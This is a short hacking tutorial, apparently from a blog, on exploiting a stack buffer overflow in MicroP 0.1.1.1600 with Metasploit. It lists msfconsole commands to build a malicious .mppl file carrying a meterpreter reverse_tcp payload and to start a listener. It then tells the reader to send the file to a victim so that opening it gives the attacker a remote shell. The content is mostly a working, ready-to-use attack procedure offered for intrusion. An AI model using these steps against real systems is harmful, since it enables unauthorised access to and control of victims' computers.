Hack Remote Windows PC using MicroP 0.1.1.1600 (MPPL File) Stack Buffer Overflow

This module exploits a vulnerability found in MicroP 0.1.1.1600. A stack-based buffer overflow occurs when the content of a .mppl file gets copied onto the stack, which overwrites the lpFile Name parameter of a Create FileA () function, and results arbitrary code execution under the context of the user.
MicroP 0.1.1.1600
Windows XP SP 2
Windows 7
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/microp_mppl
Msf exploit (microp_mppl)>set payload windows/meterpreter/reverse_tcp
Msf exploit (microp_mppl)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (microp_mppl)>exploit

After we successfully generate the malicious MPPL File, it will stored on your local computer
/root/.msf4/local/msf.mppl

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.mppl files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
